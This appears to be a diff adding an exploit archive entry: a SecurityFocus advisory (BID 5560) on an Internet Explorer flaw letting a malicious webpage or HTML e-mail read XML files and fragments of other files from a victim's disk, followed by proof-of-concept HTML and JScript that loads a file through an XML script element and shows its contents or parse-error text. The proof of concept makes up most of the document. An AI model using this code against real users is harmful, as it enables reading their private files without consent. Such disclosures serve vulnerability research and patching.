@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/5560/info
+
+A flaw in Microsoft Internet Explorer may reveal the entire contents of XML files and partial contents of other files to attackers. This vulnerability allows an attacker to read the entire contents of XML files, and fragments of other files, existing in a known location, from a victim user's system.
+
+This vulnerability can be exploited via a malicious webpage or via malicious HTML e-mail. Other applications that use the Internet Explorer engine are affected as well (Outlook, MSN Explorer, etc.). 
+
+<script language="xml" src="getFile.asp" id="oFile"></script>
+<script language="jscript">
+onload=function () {
+var oXD=oFile.XMLDocument,
+oPE=oXD.parseError;
+
+alert(
+oXD.firstChild || oPE.line>0 ?
+"File found!\n"+
+"Details:\n\n"+
+(oXD.xml || "Line "+oPE.line+" contains '"+oPE.srcText+"'")
+:
+"File does not exist or could not be retrieved."
+);
+}
+</script> 
